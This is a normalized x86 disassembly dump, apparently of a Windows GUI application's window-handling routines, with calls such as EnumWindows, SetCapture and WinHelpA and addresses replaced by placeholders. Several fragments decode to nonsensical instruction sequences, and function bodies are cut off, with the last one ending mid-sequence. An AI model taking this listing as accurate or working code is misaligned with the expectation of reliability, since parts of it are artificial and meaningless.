mov eax ebx
call sub_43c06c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_433334
push ebx
mov ebx eax
mov eax ebx
call sub_43c084
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43340a
jmp sub_403858
sub_4334b4
mov eax [ r-xdata ]
retn
sub_4334bc
xor eax eax
retn
sub_4334e0
retn
sub_4335f8
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43e0c8
sub_433670
push ebx
mov ebx eax
mov eax ebx
call sub_4514e0
test eax eax
je r-xdata
mov eax ebx
call sub_43b87c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_433694
xor eax eax
retn
sub_43375b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5c85173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_433774
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403300
sub_433865
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_43386e
jmp sub_403858
j_sub_433865
jmp sub_433865
sub_433875
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433a20
push ebx
mov ebx eax
mov eax ebx
call sub_439f58
mov eax ebx
call sub_43b87c
pop ebx
retn
sub_433a34
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_433a40
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43e0c8
sub_433a54
test dl dl
je r-xdata
xor edx edx
call sub_433a68
retn
mov dl 0x1
call sub_433a68
retn
sub_433b44
push ebx
mov ebx eax
mov eax ebx
call sub_43f114
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433b58
call sub_43e0c8
retn
sub_433bee
jmp sub_403858
sub_433bf5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433bfc
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_433c6c
mov al [ eax + 0x211 ]
retn
sub_433ca0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43e0c8
sub_433e80
call sub_43e0c8
retn
sub_433efd
jmp sub_403858
sub_433f04
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433f61
jmp sub_403858
sub_433f68
pop ebp
retn
sub_433f6c
sub [ rw-data ] 0x1
retn
sub_4340c9
jmp sub_403858
sub_4340d0
pop ebp
retn
sub_4340d4
sub [ rw-data ] 0x1
retn
sub_4340dc
xchg [ fs : esi ] al
cmc
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_434954
sub_4340ed
add eax 0xffffffe0
jmp sub_4346d4
sub_4340f5
add eax 0xffffffe0
jmp sub_43473c
sub_4340fd
add eax 0xffffffe0
jmp sub_434850
sub_434105
add eax 0xffffffe0
jmp sub_4348c4
sub_43410d
add eax 0xffffffe0
jmp sub_434380
sub_434115
add eax 0xffffffe0
jmp sub_434394
sub_43411d
add eax 0xffffffe0
jmp sub_43440c
sub_434125
add eax 0xffffffe0
jmp sub_4344b0
sub_43412d
add eax 0xffffffe0
jmp sub_4344b4
sub_434135
add eax 0xffffffe0
jmp sub_43453c
sub_43413d
add eax 0xffffffe0
jmp sub_434684
sub_434145
add eax 0xffffffe0
jmp sub_434688
sub_43414d
add eax 0xffffffe0
jmp sub_4346a4
sub_43415f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4055c8
sub_434169
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4055dc
sub_43433d
jmp sub_403858
sub_434344
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434380
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ea8
pop ebx
retn
sub_4343fb
jmp sub_403858
sub_434402
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434494
jmp sub_403858
sub_43449b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4344b0
mov al 0x1
retn
sub_43452f
jmp sub_403858
sub_434536
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434634
jmp sub_403858
sub_43463b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434684
mov [ eax + 0xc ] edx
retn
sub_434688
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43472c
jmp sub_403858
sub_434733
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434832
jmp sub_403858
sub_434839
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4348b2
jmp sub_403858
sub_4348b9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434944
jmp sub_403858
sub_43494b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434a3f
jmp sub_403858
sub_434a46
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_434b08
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_434a54
call EnumWindows
retn
sub_434b9a
jmp sub_403858
sub_434ba1
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_434bac
xor eax eax
retn
sub_434ca5
jmp sub_403858
sub_434cac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434d96
jmp sub_403858
sub_434d9d
pop ebp
retn
sub_434df2
jmp sub_403858
sub_434df9
pop ebp
retn
sub_435f7c
jmp r-xdata
sub_435f7e
0xe8ffe9ff 0xe7ff
sub_435f85
jmp esi
sub_436f0d
add eax 0xffffff8c
jmp sub_443100
sub_436f15
add eax 0xffffff8c
jmp sub_443104
sub_436f1d
add eax 0xffffff8c
jmp sub_4431f0
sub_436f25
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_436f32
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_436f3f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_436f4c
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_436f59
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_436f66
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_436f73
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_436f80
add eax 0xffffff8c
jmp sub_444860
sub_436f92
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4055c8
sub_436f9c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4055dc
sub_4370d8
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_4373eb
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_41381c
retn
sub_437408
push 0x15
mov ecx rw-data
call sub_4137dc
retn
sub_4374f4
call GetCapture
call sub_4371d8
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_437758
push ebx
push eax
push sub_4378dc
call sub_41a9a0
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_437770
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4377a0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41aa54
pop ebx
retn
sub_43787e
jmp sub_4035a4
sub_4378b0
xor eax eax
retn
sub_4378b4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_4378cc
retn
sub_4378d0
mov eax [ rw-data ]
retn
sub_4378d8
retn
sub_437906
jmp sub_4035a4
sub_43790b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437928
call sub_40335c
xor eax eax
mov [ rw-data ] eax
retn
sub_437938
call sub_403358
xor eax eax
mov [ rw-data ] eax
retn
sub_437948
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403428
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4379f8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_437a10
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_437a5c
retn
sub_437c14
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403300
pop esi
retn
sub_437c28
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403300
pop esi
retn
sub_437c3c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_437c48
mov eax 0x4
retn
sub_437c50
retn
sub_438841
jmp sub_4035a4
sub_438b2e
jmp sub_403858
sub_438ba0
jmp sub_403858
sub_438bac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_4388d4
sub_438d2b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41da34
retn
sub_438d41
jmp sub_403858
sub_438d68
jmp sub_403858
sub_438dea
jmp sub_403858
sub_438e12
jmp sub_403858
sub_438e19
mov esp ebp
pop ebp
retn
sub_438ed1
jmp sub_403858
sub_438f28
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_438ef4
mov [ ebx + 0x58 ] esi
sub_43907c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_439090
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_439179
jmp sub_403858
sub_439180
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439203
jmp sub_403858
sub_43920a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4395d7
shl [ ebx ] 0xc0
retn
sub_4395dc
mov al [ eax + 0x58 ]
retn
sub_4395e0
xor eax eax
retn
sub_4395e4
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_4395ec
mov eax [ eax + 0x30 ]
retn
sub_439690
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43973c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_439754
mov [ eax + 0x5d ] dl
retn
sub_439758
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43d32c
sub_439768
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_439c4b
jmp sub_403858
sub_439c52
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439cb4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_439d38
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_439e55
jmp sub_403858
sub_439e5c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439f58
push eax
xor ecx ecx
mov edx 0xb037
call sub_43b4f4
retn
sub_43a119
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403300
sub_43a1ca
jmp sub_403858
sub_43a1d1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a2a8
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43b4f4
sub_43a2c0
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43b4f4
retn
sub_43a2d0
push edx
mov edx 0xd
call sub_43b4f4
retn
sub_43a2dc
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43a2f0
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43a3d1
jmp sub_403858
sub_43a3d8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a3e0
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43b4f4
sub_43a450
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43a464
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43a470
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43a478
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43b4f4
sub_43a49c
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43b4f4
sub_43a4c0
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43b4f4
sub_43a508
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43a510
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43b4f4
sub_43a534
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43b4f4
sub_43a558
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43b4f4
sub_43a574
push ebx
mov ebx eax
call sub_4374f4
cmp ebx eax
sete al
pop ebx
retn
sub_43a5ac
push esi
mov dl 0x1
mov si 0xffce
call sub_403300
pop esi
retn
sub_43a6f6
jmp sub_403858
sub_43a6fd
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a820
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43a794
retn
sub_43a874
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43a961
jmp sub_403858
sub_43a980
xor eax eax
retn
sub_43a984
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43a99c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43a9b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43a9d0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43a9e8
retn
sub_43aaac
retn
sub_43aab0
cmp eax [ rw-data ]
sete al
retn
sub_43ab24
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43ac40
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403300
pop esi
pop ebp
retn 0x4
sub_43ac80
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43af17
jmp sub_403858
sub_43af1e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43af28
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403300
pop esi
retn
sub_43af3c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403300
pop esi
retn
sub_43b20b
jmp sub_403858
sub_43b2b4
push esi
mov si 0xffee
call sub_403300
pop esi
retn
sub_43b2c0
mov al 0x1
retn
sub_43b598
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4399a0
retn
sub_43b5bc
retn
sub_43b7d5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417170
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43b7f0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_4194a8
retn
sub_43b8e8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43bf00
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43bf08
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43bf10
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43bfc8
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43bfe8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43a49c
mov [ ebx + 0x9a ] 0x1
sub_43c040
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43a440
mov [ ebx + 0x56 ] 0x1
sub_43c064
mov [ edx + 0xc ] 0x1
retn
sub_43c06c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43b4f4
sub_43c084
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43b4f4
sub_43c09c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43c302
jmp sub_403858
sub_43c309
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c334
mov eax [ r-xdata ]
retn
sub_43c4d0
jmp sub_403858
sub_43c4d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c5f8
mov eax [ eax + 0xb8 ]
retn
sub_43c660
push ebx
mov ebx eax
mov eax ebx
call sub_43a984
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43c67c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43c814
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43c844
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43c84c
call sub_43940c
retn
sub_43c94c
jmp sub_403858
sub_43cb0c
jmp sub_403858
sub_43cb5c
jmp sub_403858
sub_43cb94
retn
sub_43ce1d
jmp sub_403858
sub_43cfa5
jmp sub_403858
sub_43d307
jmp sub_403858
sub_43d3b3
jmp sub_403858
sub_43d3c0
inc [ eax + 0x160 ]
retn
sub_43d3c8
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43d3e8
sub_43d3e8
xor edx edx
call sub_43d32c
retn
sub_43d4b5
jmp sub_403858
sub_43d4bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d5ab
jmp sub_403858
sub_43dad2
jmp sub_403858
sub_43dad9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dca1
jmp sub_403858
sub_43dca8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dd7c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43df69
jmp sub_403858
sub_43df70
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43e060
xor eax eax
retn
sub_43e0c8
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43b4f4
sub_43e1f6
jmp sub_4035a4
sub_43e32b
jmp sub_403858
sub_43e332
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e33c
jmp sub_4035a4
sub_43e341
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e8fc
jmp sub_403858
sub_43e903
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e90c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
j_sub_403858#6
jmp sub_403858
sub_43ee5c
push ebx
mov ebx eax
call sub_41c27c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43b4f4
pop ebx
retn
sub_43ee78
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43b4f4
retn
sub_43ee8c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43b4f4
retn
sub_43ee9c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43b4f4
retn
sub_43f148
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_440e38
pop esi
retn
sub_43f25c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f2ac
pop esi
retn
sub_43f270
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f398
pop esi
retn
sub_43f284
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43f298
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43f38b
jmp sub_403858
sub_43f392
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f422
jmp sub_403858
sub_43f429
pop ebx
pop ecx
pop ebp
retn
sub_43f430
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43f440
retn
sub_43f444
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43f464
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43f5c4
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43f694
retn
sub_43f7ac
jmp sub_403858
sub_43f7b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f87e
jmp sub_403858
sub_43f8a8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43f93a
jmp sub_403858
sub_43fb0c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43fdb0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43fe8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43d8b8
pop esi
retn
sub_43ff50
push esi
mov si 0xffc1
call sub_403300
pop esi
retn
sub_43ff7c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43ff90
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43ffa4
call sub_43d878
retn
sub_43ffac
call sub_43d878
retn
sub_43ffb4
call sub_43d878
retn
sub_44005c
push ebx
mov ebx eax
mov eax ebx
call sub_43bf10
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d3f4
mov dx 0xb009
mov eax ebx
call sub_43d8b8
pop ebx
retn
sub_4401c0
call sub_43d878
retn
sub_4401c8
call sub_43d878
retn
sub_4401d0
call sub_43d878
retn
sub_4401d8
call sub_43d878
retn
sub_44023c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4406d2
jmp sub_403858
sub_4406d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4407b8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44095c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43b4f4
retn
sub_4409fc
push ebx
mov ebx eax
mov eax ebx
call sub_440e2c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_440a18
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_440bf0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_440b28
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_440c48
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
